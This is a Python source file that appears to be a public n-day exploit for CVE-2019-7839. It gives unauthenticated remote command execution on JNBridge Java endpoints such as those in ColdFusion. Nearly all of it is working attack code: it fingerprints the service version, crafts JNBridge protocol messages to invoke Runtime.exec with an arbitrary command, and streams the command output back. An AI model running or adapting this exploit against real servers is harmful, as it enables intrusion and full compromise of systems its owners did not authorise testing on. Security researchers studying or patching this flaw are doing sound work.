#!/usr/bin/python
############################################################
# jnbridge-exploit-java.py
# 
# Generates JNBridge protocol messages to execute the
# following code on a Java JNBridge endpoint:
# 
# public class Payload {
#   public static void main(String[] args) throws Exception {
#     Runtime r = java.lang.Runtime.getRuntime();
#     Process p = r.exec(new String[] {"CMD", "ARG1", "ARG2"});
#     BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
#     String line;
#     while((line = br.readLine()) != null) {
#       System.out.println(line);
#     }
#     br.close();
#   }
# }
# 
# Written by @NickstaDB based on the security advisory for
# CVE-2019-7839 by Moritz Bechler. Read more at the
# following links:
# 
#     https://packetstormsecurity.com/files/153439/Coldfusion-JNBridge-Remote-Code-Execution.html
#     https://nickbloor.co.uk/2019/10/12/reversing-jnbridge-to-build-an-n-day-exploit-for-cve-2019-7839/
# 
# Exploit works against at least version 7+ of JNBridge.
# Version 10.1+ has additional security features to protect
# against exploitation, but this exploit will work if they
# are not used properly.
# 
# Don't be a dick, only for use against systems you have
# permission to test against.
############################################################
# Potential improvements:
# -> Implement support for SSL/TLS endpoints
# -> Implement support for .NET endpoints (calling .NET from Java)
############################################################
import socket
import struct
import sys

#Get the JNBridge version by sending an invalid message preamble
def getJNBridgeVersion(sock):
	sock.send("\x00\x00\x00\x00\x00")
	res = sock.recv(2048)
	if res.startswith("JNB") and "\x00\x45\x00\x78\x00\x63\x00\x65\x00\x70\x00\x74\x00\x69\x00\x6f\x00\x6e" in res:
		return res[3]
	return False

#Get bytes representing the length and content of a given string
def getStrBytes(str):
	out = struct.pack("<i", len(str))
	for c in list(str):
		out += "\x00" + c
	return out

#Get bytes representing a JNBridge string param including the type and null prefix bytes
def getStrParamBytes(str):
	return "\x0a\x00" + getStrBytes(str)

def getObjRefParamBytes(objHandle, className):
	return "\x09" + objHandle + "\x00" + getStrBytes(className)

#Get the 6-byte header for an array (only handles single-dimensions)
def getArrayHeaderBytes(arr):
	arrayHeader = "\x0b" #Array type identifier
	arrayHeader += "\x01" #Number of dimensions
	arrayHeader += struct.pack("<i", len(arr)) #Array length as a 32-bit little-endian integer
	return arrayHeader

#Get bytes representing a string array
def getStrArrayParamBytes(strs):
	arrayBytes = getArrayHeaderBytes(strs)
	arrayBytes += "\x0a" #String type identifier for array elements
	arrayBytes += "\x00" #Null prefix for the System.String[] identifier
	arrayBytes += getStrBytes("System.String[]")
	
	#Append the array elements
	for str in strs:
		arrayBytes += getStrParamBytes(str)
	
	return arrayBytes

#Get bytes representing an array of objects
def getObjArrayParamBytes(objs):
	arrayBytes = getArrayHeaderBytes(objs)
	arrayBytes += "\x0c" #Object type identifier for array elements
	arrayBytes += "\x00" #Null prefix for the System.Object[] identifier
	arrayBytes += getStrBytes("System.Object[]")
	
	#Append the array elements
	for obj in objs:
		arrayBytes += obj
	
	return arrayBytes

#Get bytes representing a JNBridge static Java method call
def getStaticCallBytes(fullyQualifiedMethodName, paramDescriptors):
	methodName = fullyQualifiedMethodName.split(".")[-1]
	className = fullyQualifiedMethodName[:-(len(methodName) + 1)]
	
	callBytes = "\xff\xff\x00" #Mandatory first bytes
	callBytes += "\x0b" #Argument names index for static Java method call
	
	callBytes += getStrParamBytes(className)
	callBytes += getStrParamBytes(methodName)
	callBytes += getStrArrayParamBytes(paramDescriptors) #Method parameters
	
	return callBytes

#Get bytes representing a JNBridge virtual Java method call
def getVirtualCallBytes(objHandle, methodName, paramDescriptors):
	callBytes = "\xff\xff\x00" #Mandatory first bytes
	callBytes += "\x15"	#Argument names index for virtual Java method call
	callBytes += "\x03" + objHandle #Object to call a method on
	callBytes += getStrParamBytes(methodName) #Method to call
	callBytes += getStrArrayParamBytes(paramDescriptors) #Method parameters
	return callBytes

#Get bytes representing a JNBridge Java constructor call
def getConstructorCallBytes(className, paramDescriptors):
	callBytes = "\xff\xff\x00" #Mandatory first bytes
	callBytes += "\x00" #Argument names index for a Java constructor call
	callBytes += getStrParamBytes(className) #Class to construct
	callBytes += getStrArrayParamBytes(paramDescriptors) #Constructor parameters
	return callBytes

#Extract an object handle from a JNB response
def getReturnedObjHandle(res):
	if "\x00E\x00x\x00c\x00e\x00p\x00t\x00i\x00o\x00n" not in res and len(res) > 21:
		return res[14:22]
	else:
		return None

#Extract a string from a JNB response
def getReturnedString(res):
	if len(res) > 13 and res[13] == "\x00":
		#Null returned, end of the line
		return None
	else:
		#Extract and return the string
		strlen = struct.unpack("<i", res[15:19])[0]
		thestr = ""
		for i in range(20, 20 + (2 * strlen), 2):
			thestr += res[i]
		return thestr

#Prefix a JNB message with a header, send it, and read the response
def sendJNBMsg(msg, jnbVersion, sock):
	sock.send("JNB" + jnbVersion + "0" + struct.pack("<i", len(msg) + 2) + msg + "\x00\x00")
	return sock.recv(2048)

#Grab exploit params
print ""
if len(sys.argv) < 3:
	print "Usage: jnbridge-exploit-java.py <host:port> <cmd> [cmd params...]"
	print "  E.g."
	print "    jnbridge-exploit-java.py 127.0.0.1 8085 cmd /c dir \"C:\\Program Files\""
	print ""
	sys.exit()
(target_host, target_port) = sys.argv[1].split(":", 1)
target_cmd = []
for i in range(2, len(sys.argv)):
	target_cmd.append(sys.argv[i])

#Connect to the target
print "[~] Connecting to " + target_host + ":" + target_port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_host, int(target_port)))
sock.settimeout(30.0)
print "[+] Connected"

#Do JNBridge service detection
print "[~] Attempting to get JNBridge version."
jnbVersion = getJNBridgeVersion(sock)
if jnbVersion == False:
	print "[-] Target does not look like a JNBridge service (or it uses SSL/TLS, currently unsupported)"
	sock.close()
	sys.exit()
print "[+] Service appears to be a JNBridge service, version byte: 0x" + jnbVersion.encode("hex")

############################################################
# This is where I put on my robe and wizard hat and make the magic happen
############################################################
#Run the payload program
if id(sys) % 42 == 0:
	print "[~] Meditating to regain mana"
print "[~] Calling java.lang.Runtime.getRuntime()"
msg = getStaticCallBytes("java.lang.Runtime.getRuntime", [])
msg = msg + getObjArrayParamBytes([]) #No parameters
jRuntime = getReturnedObjHandle(sendJNBMsg(msg, jnbVersion, sock))
if jRuntime == None:
	print "[-] Call failed"
	sock.close()
	sys.exit()
print "[+] Got handle to Runtime object: 0x" + jRuntime.encode("hex")

print "[~] Calling Runtime.exec(String[])"
msg = getVirtualCallBytes(jRuntime, "exec", ["[Ljava.lang.String;"])
msg = msg + getObjArrayParamBytes([getStrArrayParamBytes(target_cmd)])
jProcess = getReturnedObjHandle(sendJNBMsg(msg, jnbVersion, sock))
if jProcess == None:
	print "[-] Call failed"
	sock.close()
	sys.exit()
print "[+] Got handle to Process object: 0x" + jProcess.encode("hex")

print "[~] Calling Process.getInputStream()"
msg = getVirtualCallBytes(jProcess, "getInputStream", [])
msg = msg + getObjArrayParamBytes([])
jInputStream = getReturnedObjHandle(sendJNBMsg(msg, jnbVersion, sock))
if jInputStream == None:
	print "[-] Call failed"
	sock.close()
	sys.exit()
print "[+] Got handle to InputStream object: 0x" + jInputStream.encode("hex")

print "[~] Constructing InputStreamReader from InputStream"
msg = getConstructorCallBytes("java.io.InputStreamReader", ["Ljava.io.InputStream;"])
msg = msg + getObjArrayParamBytes([getObjRefParamBytes(jInputStream, "java.io.InputStream")])
jInputStreamReader = getReturnedObjHandle(sendJNBMsg(msg, jnbVersion, sock))
if jInputStreamReader == None:
	print "[-] Call failed"
	sock.close()
	sys.exit()
print "[+] Got new InputStreamReader object: 0x" + jInputStreamReader.encode("hex")

print "[~] Constructing BufferedReader from InputStreamReader"
msg = getConstructorCallBytes("java.io.BufferedReader", ["Ljava.io.Reader;"])
msg = msg + getObjArrayParamBytes([getObjRefParamBytes(jInputStreamReader, "java.io.InputStreamReader")])
jBufferedReader = getReturnedObjHandle(sendJNBMsg(msg, jnbVersion, sock))
if jBufferedReader == None:
	print "[-] Call failed"
	sock.close()
	sys.exit()
print "[+] Got new BufferedReader object: 0x" + jBufferedReader.encode("hex")

print "[~] Reading command output..."
print ""
line = ""
while line != None:
	msg = getVirtualCallBytes(jBufferedReader, "readLine", [])
	msg = msg + getObjArrayParamBytes([])
	line = getReturnedString(sendJNBMsg(msg, jnbVersion, sock))
	if line != None:
		print line
print ""
print "[+] Done reading command output"

print "[~] Calling BufferedReader.close()"
msg = getVirtualCallBytes(jBufferedReader, "close", [])
msg = msg + getObjArrayParamBytes([])
sendJNBMsg(msg, jnbVersion, sock)
sock.close()
print "[+] Exploit complete"
